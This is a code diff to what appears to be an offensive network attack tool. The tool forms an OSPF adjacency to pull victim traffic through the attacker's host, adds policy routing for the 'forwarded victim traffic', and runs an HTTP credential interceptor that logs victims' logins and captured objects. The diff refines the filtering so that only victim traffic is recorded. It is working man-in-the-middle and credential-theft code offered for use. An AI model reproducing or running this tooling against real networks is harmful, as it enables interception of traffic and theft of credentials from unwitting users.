@@ -419,14 +419,18 @@ def setup_and_form_adjacency(interface, ospf_params, target_ip=None, vpn_subnets
     return interface, our_ip, offer, dhcp_server_ip, lsdb_subnets, default_route_added
 
 
-def start_http_intercept(sniff_iface):
-    """Launch the HTTP credential/object interceptor in a daemon thread."""
+def start_http_intercept(sniff_iface, our_ips=None):
+    """Launch the HTTP credential/object interceptor in a daemon thread.
+
+    our_ips: IPs to exclude — filters out locally generated connections so only
+    forwarded victim traffic is logged.  Pass our interface IP and loopback alias.
+    """
     print_step("START", f"Starting HTTP interceptor on {sniff_iface}")
     print_step("OK", f"Credential log: {os.path.abspath(http_intercept.CRED_LOG)}")
     print_step("OK", f"HTTP objects  : {http_intercept.INTERCEPT_DIR}")
     thread = threading.Thread(
         target=http_intercept.sniff_loop,
-        kwargs={"iface": sniff_iface},
+        kwargs={"iface": sniff_iface, "exclude_src_ips": our_ips or []},
         daemon=True,
     )
     thread.start()
@@ -493,10 +497,21 @@ def main():
             tun=pre_tun, vpn_net24=pre_vpn_net24,
         )
 
+        # Force forwarded victim packets through a dedicated routing table so
+        # OpenVPN's tun0 routes don't hijack non-VPN traffic.
+        ospf_adjacency.setup_policy_routing(
+            ospf_interface, ospf_params["src_ip"],
+            tun_iface=tun_iface,
+            vpn_subnets=vpn_subnets if tun_iface else None,
+        )
+
         # ── Phase 6: HTTP interception on the traffic we now carry ───────────
         # Prefer the tunnel (plaintext VPN traffic); fall back to the physical
         # interface when there is no VPN relay.
-        start_http_intercept(tun_iface or ospf_interface)
+        our_ips = {our_ip}
+        if loopback_alias_ip:
+            our_ips.add(loopback_alias_ip)
+        start_http_intercept(tun_iface or ospf_interface, our_ips=our_ips)
 
         # ── Debug console — runs in background while Phase 7 blocks ──────────
         debug_thread = threading.Thread(
@@ -531,6 +546,7 @@ def main():
         # Here we clean up the iptables rules and restore ip_forward.
         print_step("START", "Teardown: removing forwarding rules and restoring system state")
         if ospf_iface_for_fwd:
+            ospf_adjacency.teardown_policy_routing(ospf_iface_for_fwd)
             ospf_adjacency.teardown_forwarding(ospf_iface_for_fwd, interface)
             if default_route_added:
                 ospf_adjacency.remove_default_route(ospf_params["src_ip"], ospf_iface_for_fwd)
